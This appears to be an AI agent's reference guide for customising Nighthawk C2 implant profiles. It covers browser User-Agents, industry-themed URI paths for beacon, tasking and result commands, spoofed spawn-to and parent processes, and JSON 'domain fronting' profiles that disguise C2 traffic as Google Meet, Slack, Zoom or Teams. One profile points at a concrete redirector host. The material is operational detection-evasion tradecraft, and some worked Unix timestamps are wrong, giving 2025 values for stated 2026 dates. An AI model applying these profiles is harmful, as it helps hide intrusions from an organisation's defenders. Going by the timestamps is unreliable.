# Data Generation Patterns

**Comprehensive guide for generating legitimate, engagement-specific data for Nighthawk profile customization.**

---

## Gener Generation Principles

**Legitimate Data** = Data that:
1. **Exists in real world**: Current browser versions, real .NET assemblies, plausible URIs
2. **Matches target environment**: Industry-appropriate patterns (financial APIs, healthcare FHIR)
3. **Is unique per engagement**: No reuse of UUIDs, assembly names, URI paths across operations
4. **Blends with legitimate traffic**: Indistinguishable from target organization's normal traffic

**Avoid**:
- ❌ Test data ("test.com", "example.org", "Mozilla/5.0 Test")
- ❌ Outdated data (IE6 User-Agents, .NET 1.1 assemblies)
- ❌ Obviously synthetic data ("C2-Server", "Beacon-001")
- ❌ Reused data from previous engagements (creates fingerprint)

---

## User-Agent String Generation

**Sources**:
- Research: Web (2025 OPSEC best practices), Codebase (industry examples)
- Confidence: 0.85 (strong practitioner guidance)

### User-Agent Anatomy

**Standard Browser User-Agent**:
```
Mozilla/5.0 ({platform}) AppleWebKit/{webkit-version} (KHTML, like Gecko) {browser}/{browser-version} Safari/{safari-version}
```

**Components**:
- **Mozilla/5.0**: Historical compatibility token (always present)
- **Platform**: OS and architecture (e.g., `Windows NT 10.0; Win64; x64`)
- **AppleWebKit**: Rendering engine version
- **KHTML, like Gecko**: Compatibility tokens
- **Browser**: Chrome, Firefox, Edge, Safari
- **Version**: Browser version (e.g., `120.0.0.0`)

### Current Browser Versions (January 2026)

**Chrome**:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36
```

**Firefox**:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
```

**Edge (Chromium-based)**:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0
```

**Safari (macOS)**:
```
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15
```

**Mobile Chrome (Android)**:
```
Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36
```

**Mobile Safari (iOS)**:
```
Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1
```

### Legacy Browser Versions (Healthcare, Industrial)

**Internet Explorer 11** (Windows 7):
```
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
```

**Internet Explorer 11** (Windows 8.1):
```
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko
```

**Chrome (Extended Support for Healthcare)**:
```
Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
```

**Note**: Chrome 109 was last version supporting Windows 7/8/8.1 (February 2023)

### Service-Specific User-Agents (2025)

**Slack Desktop App**:
```
Slack/4.36.140 (macOS 14.2.1; x64; en-US)
Slack/4.36.140 (Windows 10; x64; en-US)
Slack/4.36.140 (Linux x86_64; en-US)
```

**Microsoft Teams**:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Teams/1.7.00.26676
```

**Zoom**:
```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Zoom/5.17.0
```

**Discord**:
```
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9156 Chrome/120.0.6099.291 Electron/28.3.1 Safari/537.36
```

### Industry-Specific User-Agent Selection

| Industry | Recommended User-Agents | Rationale |
|----------|------------------------|-----------|
| Financial Services | Chrome 120-122 (Windows 10/11) | Modern corporate browsers, strict security policies |
| Healthcare | IE11 (Windows 7/8.1) or Chrome 109-122 | Mix of legacy and modern systems |
| Tech/SaaS | Chrome/Firefox/Edge latest (Windows/macOS/Linux) | Cutting-edge browser adoption |
| Manufacturing | Chrome 109 (Windows 7) or modern (Windows 10) | Legacy SCADA systems or modern IoT |
| Government | Edge (Windows 10/11), Chrome Enterprise | Standardized enterprise browsers |
| Retail | Chrome/Safari latest (mix of desktop/mobile) | Consumer-facing, mobile-heavy |

### User-Agent Customization Workflow

1. **Research target environment**:
   - Corporate browser policy (via recon, OSINT, or job postings mentioning "supported browsers")
   - Windows version demographics (modern Windows 10/11 vs. legacy Windows 7)
   - Industry norms (healthcare = legacy, tech = modern)

2. **Select base browser**:
   - Chrome (most common corporate browser)
   - Firefox (privacy-focused organizations)
   - Edge (Microsoft-centric environments)
   - IE11 (legacy healthcare/industrial)

3. **Match OS version to target**:
   - Windows NT 10.0 = Windows 10/11 (modern)
   - Windows NT 6.3 = Windows 8.1 (legacy)
   - Windows NT 6.1 = Windows 7 (legacy healthcare/industrial)

4. **Use current browser version** (as of engagement date):
   - Check https://www.whatismybrowser.com/guides/the-latest-version/
   - Or use version from engagement month (e.g., January 2026 = Chrome 122, Firefox 122)

5. **Validate**:
   - Length: Typical User-Agents are 110-150 characters
   - Format: Matches legitimate browser User-Agent structure
   - Version: Current (not outdated, not future)

**Best Practices**:
- ✅ Use version current as of engagement date
- ✅ Match OS version to target environment
- ✅ Vary across engagements (Chrome 120 for one, Firefox 121 for another)
- ❌ Don't use outdated versions unless matching legacy environment
- ❌ Don't invent custom browsers ("ACME Corp Browser")
- ❌ Don't use mobile User-Agents for desktop environments (and vice versa)

---

## URI Path Generation

**Sources**:
- Research: Codebase (industry patterns), Web (REST conventions)
- Confidence: 0.80 (strong practitioner guidance)

### REST API Path Conventions

**Standard Structure**:
```
/{namespace}/{version}/{resource}/{subresource}/{action}

Examples:
/api/v2/accounts/balance
/services/v1/trading/orders/create
/rest/v3/users/profile/update
```

**Components**:
- **Namespace**: `api`, `services`, `rest`, `v1`, etc. (organizational convention)
- **Version**: `v1`, `v2`, `v3` (API versioning)
- **Resource**: `accounts`, `users`, `devices` (noun, plural)
- **Subresource**: `balance`, `profile`, `status` (nested resource)
- **Action**: `create`, `update`, `delete` (verb for mutations) - Often implied by HTTP method

**Best Practices**:
- ✅ Use nouns for resources (`/api/accounts` not `/api/getAccounts`)
- ✅ Use plural nouns (`/api/users` not `/api/user`)
- ✅ Use versioning (`/api/v2/...` not `/api/...`)
- ✅ Use hierarchical paths for relationships (`/api/users/123/orders`)
- ❌ Don't use verbs in URIs (except for actions: `/api/auth/login` is acceptable)
- ❌ Don't use file extensions (`/api/data.json` → `/api/data`)

### URI Patterns by Industry

**Financial Services (Banking, Trading, FinTech)**:
```
/api/v2/accounts/balance
/api/v2/accounts/{account-id}/transactions
/services/v1/trading/orders
/services/v1/trading/orders/{order-id}/status
/api/v1/market/quotes
/api/v1/market/instruments/{symbol}
/rest/v2/payments/initiate
/rest/v2/payments/{payment-id}/status
```

**Healthcare (EHR, FHIR, HL7)**:
```
/fhir/r4/Patient
/fhir/r4/Patient/{patient-id}
/fhir/r4/Observation
/api/ehr/v1/appointments
/api/ehr/v1/appointments/{appointment-id}
/hl7/v2/messages
/api/v1/practitioners/{practitioner-id}/schedule
```

**Tech/SaaS (Telemetry, Analytics, Monitoring)**:
```
/api/v2/telemetry/metrics
/api/v2/telemetry/events
/v1/analytics/pageviews
/v1/analytics/events/{event-id}
/api/monitoring/v1/health
/api/monitoring/v1/alerts
/v2/logs/ingest
/v2/traces/collect
```

**Manufacturing/Industrial (SCADA, IoT, PLCs)**:
```
/scada/v1/devices/status
/scada/v1/devices/{device-id}/metrics
/api/plc/v1/commands
/api/plc/v1/commands/{command-id}/result
/iot/v2/sensors/readings
/iot/v2/sensors/{sensor-id}/data
/api/v1/inventory/status
/api/v1/equipment/{equipment-id}/diagnostics
```

**Retail/E-Commerce**:
```
/api/v1/products
/api/v1/products/{product-id}
/api/v2/orders
/api/v2/orders/{order-id}/status
/api/v1/inventory/check
/api/v1/customers/{customer-id}/cart
```

**Government/Defense**:
```
/api/v1/cases
/api/v1/cases/{case-id}/documents
/services/v2/clearances/verify
/api/v1/personnel/{personnel-id}/status
/rest/v1/assets/inventory
```

### Three-Command Pattern for Nighthawk

Nighthawk profiles have three standard C2 commands. Design cohesive URI set:

**Pattern 1: Telemetry/Monitoring Theme**:
```json
{
  "status": "/api/v2/telemetry/health",
  "getcommands": "/api/v2/telemetry/tasks",
  "putresult": "/api/v2/telemetry/results"
}
```

**Pattern 2: Device Management Theme**:
```json
{
  "status": "/api/v1/devices/status",
  "getcommands": "/api/v1/devices/commands",
  "putresult": "/api/v1/devices/reports"
}
```

**Pattern 3: Analytics Theme (SaaS)**:
```json
{
  "status": "/v1/analytics/ping",
  "getcommands": "/v1/analytics/events",
  "putresult": "/v1/analytics/metrics"
}
```

**Pattern 4: Healthcare Theme (FHIR)**:
```json
{
  "status": "/fhir/r4/DiagnosticReport",
  "getcommands": "/fhir/r4/Task",
  "putresult": "/fhir/r4/Observation"
}
```

**Pattern 5: Industrial Theme (SCADA)**:
```json
{
  "status": "/scada/v1/heartbeat",
  "getcommands": "/scada/v1/instructions",
  "putresult": "/scada/v1/telemetry"
}
```

**Best Practices**:
- ✅ Use cohesive theme across all three commands
- ✅ Match theme to target industry
- ✅ Follow REST conventions within theme
- ❌ Don't mix themes (healthcare FHIR status + manufacturing SCADA commands = inconsistent)
- ❌ Don't use obviously C2 paths (`/beacon`, `/c2`, `/implant`)

---

## HTTP Header Generation

### Standard Headers (Always Include)

**Content-Type**: Match URI pattern
```json
{
  "Content-Type": "application/json"          // For REST APIs
  "Content-Type": "application/fhir+json"     // For FHIR APIs
  "Content-Type": "application/xml"           // For SOAP/Legacy APIs
}
```

**Accept**: What response formats client accepts
```json
{
  "Accept": "application/json"                // JSON only
  "Accept": "application/json, text/plain, */*"  // Multiple formats (like browsers)
}
```

**User-Agent**: See User-Agent Generation section above

### Custom Headers (Industry-Appropriate)

**Request Tracking** (Universal):
```json
{
  "X-Request-ID": "{uuid}",                   // Generate UUIDv4 per request
  "X-Correlation-ID": "{uuid}",               // Trace request across systems
  "X-Trace-ID": "{trace-format}"              // Distributed tracing ID
}
```

**Client Identification** (APIs with versioning):
```json
{
  "X-Client-Version": "2.1.4",                // Semantic version
  "X-App-Version": "4.7.2",                   // Application version
  "X-Platform": "Windows",                    // Platform identifier
  "X-Device-ID": "{uuid}"                     // Persistent device identifier
}
```

**Tenant/Organization** (Multi-Tenant SaaS):
```json
{
  "X-Tenant-ID": "acme-corp-prod",            // Tenant identifier
  "X-Organization-ID": "{uuid}",              // Organization UUID
  "X-Environment": "production"               // Environment name
}
```

**Industry-Specific Headers**:

**Financial**:
```json
{
  "X-Institution-ID": "FDIC-12345",
  "X-Transaction-ID": "{uuid}",
  "X-Session-Token": "{hex-string}"
}
```

**Healthcare**:
```json
{
  "X-Facility-ID": "NPI-1234567890",
  "X-Patient-Context": "{encrypted-id}",
  "X-FHIR-Version": "4.0.1"
}
```

**Tech/SaaS**:
```json
{
  "X-API-Version": "2024-01",
  "X-Client-ID": "{client-id}",
  "X-Datadog-Trace-ID": "{trace-id}"
}
```

### UUID Generation

**Format**: UUIDv4 (random): `xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx`

**Generation**:
```bash
# Linux/macOS
uuidgen | tr '[:upper:]' '[:lower:]'
# Output: 550e8400-e29b-41d4-a716-446655440000

# Online: https://www.uuidgenerator.net/version4
```

**Usage**:
- `X-Request-ID`, `X-Correlation-ID`: **Generate unique per request** (if possible in profile)
- `X-Device-ID`, `X-Organization-ID`: **Generate unique per engagement** (static within engagement)

**Best Practices**:
- ✅ Use lowercase UUIDs (some systems are case-sensitive)
- ✅ Generate different UUIDs for different header types
- ✅ Ensure UUID format is valid (correct hyphen positions, hex digits)
- ❌ Don't use sequential UUIDs (use random v4)
- ❌ Don't reuse UUIDs from previous engagements

### Semantic Version Generation

**Format**: `major.minor.patch` (e.g., `2.1.4`)

**Components**:
- **Major**: Breaking changes (e.g., 1.x.x → 2.x.x)
- **Minor**: New features (e.g., 2.1.x → 2.2.x)
- **Patch**: Bug fixes (e.g., 2.1.4 → 2.1.5)

**Generation**:
- Start with realistic base (e.g., `2.1.0` for moderately mature API)
- Increment patch version per engagement (2.1.0 → 2.1.1 → 2.1.2)
- Avoid obviously fake versions (`1.0.0` for mature API, `99.99.99`)

**Examples**:
```
Mature API: "2.7.3", "3.1.5", "4.2.1"
New API: "1.2.0", "1.3.1", "0.9.2" (pre-1.0)
Legacy API: "1.14.6", "2.31.8" (high minor/patch = long-lived)
```

**Best Practices**:
- ✅ Use realistic versions that match API maturity
- ✅ Increment across engagements to avoid fingerprinting
- ✅ Follow semantic versioning spec (semver.org)
- ❌ Don't use `0.0.1` for production APIs
- ❌ Don't use excessively high versions (`100.0.0`)

---

## .NET Assembly Name Generation

**Sources**:
- Research: Nighthawk Docs (assembly format), Codebase (legitimate assemblies)
- Confidence: 0.95 (authoritative documentation)

### Assembly Name Format

**Structure**:
```
{AssemblyName}, Version={version}, Culture={culture}, PublicKeyToken={token}, processorArchitecture={arch}
```

**Components**:
- **AssemblyName**: .NET assembly name (e.g., `System.Web.Mobile`)
- **Version**: Typically `4.0.0.0` for .NET Framework 4.x assemblies
- **Culture**: `neutral` for non-localized, or `en-US`, `fr-FR`, etc. for localized
- **PublicKeyToken**: 16-character hex string (assembly strong name signature)
- **processorArchitecture**: `MSIL` (managed), `x86`, `AMD64`, or omit

**Example**:
```
System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL
```

### Legitimate .NET Assembly Catalog

**System Assemblies** (GAC, always available):

```
System.Web.Mobile, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.Data.OracleClient, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL

System.ServiceModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL

System.Messaging, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.DirectoryServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.Management, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.EnterpriseServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.Transactions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL

System.Runtime.Remoting, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL

System.Runtime.Serialization, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL

System.IdentityModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.Web.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL
```

**Server-Specific Assemblies** (May not be on client systems):
```
System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL

System.Web.ApplicationServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL

System.Web.DynamicData, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35, processorArchitecture=MSIL
```

### Assembly Selection Workflow

1. **Determine profile module count**:
   - Count encoders + egress-transports + p2p-transports
   - Example: 2 encoders + 1 transport = 3 unique assemblies needed

2. **Select assemblies from catalog**:
   - Choose assemblies that exist on target systems
   - Desktop systems: Avoid server-only assemblies (`System.Web.*`)
   - Server systems: All assemblies available

3. **Ensure uniqueness**:
   - NO DUPLICATES within profile
   - Validate with: `jq '.["c2-profile"]["general-config"]["code-modules"] | ...  | sort | uniq -d'`

4. **Vary across engagements**:
   - Engagement 1: Use `System.Web.Mobile`, `System.Data.OracleClient`
   - Engagement 2: Use `System.ServiceModel`, `System.Messaging`
   - Engagement 3: Use `System.DirectoryServices`, `System.Management`

**Best Practices**:
- ✅ Verify assemblies exist on target OS version (via recon or Windows documentation)
- ✅ Use different assemblies across engagements (variety prevents fingerprinting)
- ✅ Ensure all PublicKeyTokens are correct (16-char hex)
- ❌ Don't invent assembly names (must be real .NET assemblies)
- ❌ Don't use same assemblies for every engagement
- ❌ Don't reuse assemblies within single profile (must be unique)

---

## Process Name Generation

### spawn-to Process Selection

**Sources**: System utilities, industry applications, common software

**Generic System Utilities** (Always available):
```
c:\\windows\\system32\\notepad.exe
c:\\windows\\system32\\calc.exe
c:\\windows\\system32\\mmc.exe              // Microsoft Management Console
c:\\windows\\system32\\dllhost.exe          // COM surrogate host
c:\\windows\\system32\\SearchProtocolHost.exe  // Windows Search
c:\\windows\\system32\\taskeng.exe          // Task Scheduler
c:\\windows\\system32\\vds.exe              // Virtual Disk Service
```

**Microsoft Office** (Common in corporate environments):
```
c:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE
c:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE
c:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE
c:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE
```

**Web Browsers** (Universal):
```
c:\\Program Files\\Google\\Chrome\\Application\\chrome.exe
c:\\Program Files\\Mozilla Firefox\\firefox.exe
c:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe
c:\\Program Files\\Internet Explorer\\iexplore.exe
```

**Industry-Specific Applications**:

**Financial**:
```
c:\\Program Files (x86)\\Bloomberg\\Terminal\\blpapi3.exe
c:\\Program Files\\Refinitiv\\Eikon\\Eikon.exe
c:\\Program Files\\FactSet\\FactSet.exe
```

**Healthcare**:
```
c:\\Program Files (x86)\\Epic\\EpicCare.exe
c:\\Program Files\\Cerner\\Millennium\\CernerClient.exe
c:\\Program Files (x86)\\Allscripts\\Professional\\TouchWorks.exe
c:\\Program Files\\Meditech\\MAGIC\\magic.exe
```

**Manufacturing**:
```
c:\\Program Files\\Rockwell Automation\\RSLinx\\Rslinx.exe
c:\\Program Files (x86)\\Siemens\\Step7\\S7bin\\s7tgtopx.exe
c:\\Program Files\\Wonderware\\InTouch\\view.exe
c:\\Program Files\\GE Digital\\Proficy\\HMI-SCADA\\iFixMain.exe
```

**Selection Workflow**:
1. **Research target environment**: Identify common applications via recon, job postings, or industry norms
2. **Verify existence**: Confirm process exists on target systems (via initial access beacon or OSINT)
3. **Select appropriate process**: Common enough to not stand out, matches environment
4. **Document selection**: Note in deployment notes why process was chosen

### parent-process Selection

**Common Parents** (Always running):
```
explorer.exe          // Windows Explorer (shell) - safest choice
svchost.exe           // Service host - very common
services.exe          // Service Control Manager - system services
```

**Application-Specific Parents**:
```
If spawn-to = EXCEL.EXE:
  parent-process = "explorer.exe" (launched from desktop/start menu)

If spawn-to = chrome.exe:
  parent-process = "explorer.exe" (launched from Explorer)

If spawn-to = notepad.exe:
  parent-process = "explorer.exe" (launched from Explorer)
```

**Plausibility Check**:
- Would a user typically launch spawn-to from parent-process?
- Is parent-process commonly running?
- Does the parent-child relationship make defensive sense?

**Best Practices**:
- ✅ Use `explorer.exe` (always safe, always running, common parent)
- ✅ Match parent to spawn-to context (Office apps typically spawned by explorer)
- ❌ Don't use implausible parents (cmd.exe parent of chrome.exe is unusual)
- ❌ Don't use suspicious parents (lsass.exe, winlogon.exe)

---

## Timestamp/Date Generation

### expire-after (Unix Timestamp)

**Calculation**:
```bash
# Method 1: Command-line (macOS/Linux)
date -j -f "%Y-%m-%d %H:%M:%S" "2026-03-31 23:59:59" +%s
# Output: 1743465599

# Method 2: Command-line (Linux)
date -d "2026-03-31 23:59:59" +%s

# Method 3: Python
python3 -c "import datetime; print(int(datetime.datetime(2026, 3, 31, 23, 59, 59).timestamp()))"

# Method 4: Online converter
# https://www.unixtimestamp.com/
```

**Buffer Calculation**:
```
Engagement end date: February 15, 2026
Buffer: 30 days
Expiration: March 17, 2026 23:59:59

Calculation:
  Feb 15, 2026 00:00:00 = 1739577600
  + (30 days * 86400 sec/day) = 2592000
  = 1742169600
  Set to 23:59:59 on March 17: 1742255999
```

**Best Practices**:
- ✅ Set expiration to engagement end + 30-90 day buffer
- ✅ Use 23:59:59 on final day (not 00:00:00)
- ✅ Verify expiration is in future (not past)
- ✅ Document expiration date in deployment notes
- ❌ Don't use far-future dates (year 2099) unless operationally justified
- ❌ Don't forget to customize (leaving baseline expiration can cause premature agent death)

---

## Identifier Generation Summary

| Identifier Type | Format | Generation Method | Usage |
|-----------------|--------|-------------------|-------|
| UUID | `xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx` | `uuidgen` or online generator | Request IDs, Device IDs, Organization IDs |
| Semantic Version | `major.minor.patch` | Increment from baseline (2.1.4 → 2.1.5) | Client version, API version |
| Unix Timestamp | Number (seconds since epoch) | `date +%s` or online converter | Expiration dates |
| Hex String | `[0-9a-f]{16,64}` | `openssl rand -hex 32` | Session tokens, keys |
| Trace ID | Varies by system | Datadog: 64-bit decimal, OpenTelemetry: 128-bit hex | Distributed tracing |

---

## Data Generation Workflow (Per Engagement)

**Step 1: Gather Engagement Context**
- Client name: "ACME Corporation"
- Industry: Financial Services
- Environment: Modern Windows 10, Chrome browser policy
- Timeline: Jan 15 - Feb 15, 2026

**Step 2: Select Patterns**
- User-Agent: Chrome 122 (Windows 10)
- URI Theme: Financial APIs (`/api/v2/accounts/...`)
- Headers: Financial-specific (`X-Institution-ID`)
- Assembly Names: 3 unique from catalog

**Step 3: Generate Unique Data**
```bash
# Generate 3 UUIDs for headers
uuidgen | tr '[:upper:]' '[:lower:]'  # X-Request-ID
uuidgen | tr '[:upper:]' '[:lower:]'  # X-Correlation-ID
uuidgen | tr '[:upper:]' '[:lower:]'  # X-Device-ID

# Calculate expiration (Feb 15 + 30 days = March 17)
date -j -f "%Y-%m-%d" "2026-03-17" +%s

# Select 3 unique assemblies
System.Web.Mobile, ...
System.Data.OracleClient, ...
System.ServiceModel, ...
```

**Step 4: Populate Profile**
- Update URIs with financial patterns
- Update User-Agent with Chrome 122
- Update headers with generated UUIDs
- Update assembly names with selected unique assemblies
- Update expiration with calculated timestamp

**Step 5: Validate**
- JSON syntax valid
- No duplicates (assemblies, UUIDs across fields)
- No test/placeholder data
- Realistic and current

---

---

## Domain Fronting Patterns

**Purpose**: Mimic traffic to specific legitimate domains (Zoom, Google Meet, Slack, Microsoft Teams) for advanced OPSEC.

**Concept**: Configure C2 traffic to appear as if it's communicating with a legitimate, high-trust domain (e.g., zoom.us, meet.google.com) by matching:
- URI paths from target domain's actual API
- User-Agent strings used by that service's clients
- HTTP headers specific to that service
- Request/response patterns matching legitimate traffic

### Domain Fronting Workflow

**When user requests**: "Customize profile to look like Zoom traffic" or `--domain zoom.us`

**Step 1: Research Target Domain**

Use orchestrating-research to gather:
- Legitimate URI paths for that service's API
- User-Agent strings used by official clients (desktop app, mobile app, web)
- Service-specific HTTP headers (X-Zoom-*, X-Teams-*, etc.)
- Request/response patterns and timing

**Research query format**:
```
"Research {domain} API traffic patterns: legitimate URI paths, User-Agent strings used by official clients, service-specific HTTP headers, request/response structure, and typical request timing for {service-name} communications"
```

**Step 2: Extract Traffic Patterns**

From research findings, extract:
- **API Base Path**: Common prefix for API calls (e.g., `/_/meet/data/` for Google Meet)
- **User-Agent**: Official client User-Agent (e.g., Zoom desktop app, Teams client)
- **Custom Headers**: Service-specific headers (e.g., `X-Session-Token`, `Origin: https://meet.google.com`)
- **Request Methods**: Typical HTTP methods (GET for polling, POST for data submission)
- **Content-Type**: JSON, form data, or custom format

**Step 3: Map to Nighthawk Commands**

Map legitimate API endpoints to Nighthawk's three commands:

| Nighthawk Command | Legitimate Endpoint | Example (Google Meet) |
|-------------------|---------------------|----------------------|
| status | Polling/heartbeat endpoint | `GET /_/meet/data/poll?meeting=conf&v=5.17` |
| getcommands | Task fetch endpoint | `GET /_/meet/data/batchexecute?rpcids=VKU5be` |
| putresult | Data submission endpoint | `POST /_/meet/data/batchexecute?rpcids=F6EZ5c` |

**Step 4: Populate Profile**

Apply researched patterns to profile:

```json
{
  "egress-config": {
    "c2-uri": "https://{redirector-domain}",
    "command-defaults": {
      "build-request": {
        "headers": {
          "User-Agent": "{service-official-user-agent}",
          "Origin": "https://{legitimate-domain}",
          "Host": "{redirector-domain}",
          "Sec-Ch-Ua": "{chromium-ua-header}",
          "Accept": "{service-accept-header}"
        }
      }
    },
    "commands": {
      "status": {
        "build-request": {
          "method": "get",
          "path": "{legitimate-polling-path}",
          "headers": {
            "X-Session-Token": "<metadata:BuiltIn.Text.Base64UrlEncode>"
          }
        }
      },
      "getcommands": {
        "build-request": {
          "method": "post",
          "path": "{legitimate-task-fetch-path}",
          "body": "<payload:BuiltIn.Text.Base64UrlEncode>"
        }
      },
      "putresult": {
        "build-request": {
          "method": "post",
          "path": "{legitimate-submit-path}",
          "body": "<payload:BuiltIn.Text.Base64UrlEncode>"
        }
      }
    }
  }
}
```

### Domain Fronting Examples

#### Example 1: Google Meet Domain Fronting

**Target Domain**: `meet.google.com`

**Research Findings**:
- Base path: `/_/meet/data/`
- User-Agent: Edge/Chrome (Chromium-based)
- Headers: `Origin: https://meet.google.com`, Sec-Ch-Ua headers, `X-Session-Token`
- Methods: GET for polling, POST for batch execute
- Query params: `?meeting=conf&v=5.17`, `?rpcids=F6EZ5c&source=meet`

**Profile Configuration**:
```json
{
  "egress-config": {
    "c2-uri": "https://redirector-axis-917167082196.us-central1.run.app",
    "command-defaults": {
      "build-request": {
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.0.0",
          "Origin": "https://meet.google.com",
          "Host": "redirector-axis-917167082196.us-central1.run.app",
          "Sec-Ch-Ua": "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Microsoft Edge\";v=\"122\"",
          "Sec-Ch-Ua-Platform": "\"Windows\"",
          "Sec-Fetch-Site": "same-origin",
          "Accept": "application/json, text/plain, */*"
        }
      }
    },
    "commands": {
      "status": {
        "build-request": {
          "method": "get",
          "path": "/_/meet/data/poll?meeting=conf&v=5.17"
        }
      },
      "getcommands": {
        "build-request": {
          "method": "post",
          "path": "/_/meet/data/batchexecute?rpcids=VKU5be&source=meet"
        }
      },
      "putresult": {
        "build-request": {
          "method": "post",
          "path": "/_/meet/data/batchexecute?rpcids=F6EZ5c&source=meet"
        }
      }
    }
  }
}
```

#### Example 2: Zoom Domain Fronting

**Target Domain**: `zoom.us` or `api.zoom.us`

**Research Areas**:
- Zoom client API endpoints
- Zoom User-Agent format (`Zoom/5.17.0`)
- Zoom-specific headers
- WebSocket vs HTTP patterns

**Expected Patterns** (Research required for exact paths):
```json
{
  "egress-config": {
    "proxy-resolve-uri": "https://zoom.us",
    "command-defaults": {
      "build-request": {
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Zoom/5.17.0",
          "Origin": "https://zoom.us"
        }
      }
    },
    "commands": {
      "status": {
        "build-request": {
          "path": "/api/v1/meetings/status"
        }
      }
    }
  }
}
```

#### Example 3: Slack Domain Fronting

**Target Domain**: `slack.com` or `api.slack.com`

**Research Findings** (From 2025 OPSEC research):
- User-Agent: `Slack/4.36.140 (Windows 10; x64; en-US)`
- Headers: `Authorization: Bearer xoxb-...`, `X-Slack-Request-Id: {uuid}`
- Paths: `/api/chat.postMessage`, `/api/conversations.list`

**Profile Configuration**:
```json
{
  "egress-config": {
    "command-defaults": {
      "build-request": {
        "headers": {
          "User-Agent": "Slack/4.36.140 (Windows 10; x64; en-US)",
          "Content-Type": "application/json",
          "Accept": "application/json, text/plain, */*",
          "X-Slack-Request-Id": "{uuid}",
          "Authorization": "Bearer xoxb-{token-format}"
        }
      }
    },
    "commands": {
      "status": {
        "build-request": {
          "path": "/api/auth.test"
        }
      },
      "getcommands": {
        "build-request": {
          "path": "/api/conversations.list"
        }
      },
      "putresult": {
        "build-request": {
          "path": "/api/chat.postMessage"
        }
      }
    }
  }
}
```

#### Example 4: Microsoft Teams Domain Fronting

**Target Domain**: `teams.microsoft.com`

**Expected Patterns** (Research required):
```json
{
  "egress-config": {
    "command-defaults": {
      "build-request": {
        "headers": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Teams/1.7.00.26676",
          "Origin": "https://teams.microsoft.com"
        }
      }
    }
  }
}
```

### Domain Fronting Research Workflow

**When user specifies `--domain {target}`**:

1. **Invoke orchestrating-research**:
   ```
   skill: "orchestrating-research"
   args: "{target} API traffic patterns: legitimate URI paths and endpoints, User-Agent strings used by official {service} clients (desktop, mobile, web), service-specific HTTP headers (X-*, authorization patterns), request/response structure and content-type, typical request timing and flow patterns, query parameters used in API calls"
   ```

